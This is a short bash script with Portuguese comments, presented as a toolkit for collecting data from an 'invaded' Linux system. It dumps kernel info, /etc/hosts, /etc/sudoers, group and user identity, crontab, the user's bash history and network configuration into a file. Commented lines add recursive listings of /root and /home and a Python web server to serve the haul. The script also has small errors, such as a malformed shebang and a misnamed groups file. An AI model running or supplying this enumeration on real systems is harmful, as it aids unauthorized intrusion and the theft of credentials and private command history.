#!bin/bash

# Conjunto de instruções para levantar dados de um sistema "invadido".
# DESMARCAR OS COMANDOS COMENTADOS CASO QUEIRA ESSE TIPO DE INFORMAÇÃO

cd ~/

echo "descobrindo informações de build do host" > tmp

uname -a >> tmp

echo "descobrindo hosts mapeados pelo sistema" >> tmp

cat /etc/hosts >> tmp

echo "descobrindo grupos de usuários e usuários presentes no sistema" >> tmp

cat /etc/passwd
cat /etc/groups >> tmp
cat /etc/sudoers >> tmp
groups >> tmp
id >> tmp

echo "descobrindo o dono do sistema" >> tmp

who >> tmp

echo "descobrindo o usuário sendo utilizado" >> tmp

whoami >> tmp

echo "descobrindo agendamentos (tasks)" >> tmp

cat /etc/crontab >> tmp

echo "descobrindo o histórico do bash do usuário atual" >> tmp

cat ~/.bash_history >> tmp

echo "descobrindo recursivamente diretórios importantes" >> tmp

#ls -R /home/ /root/ /etc/ /media/ /dev/ /opt/ >> tmp

echo "descobrindo informações de rede" >> tmp

#netstat >> tmp
ifconfig >> tmp

#echo "criando um servidor web na raiz a partir do diretorio atual"

#python3 -m http.server 1234
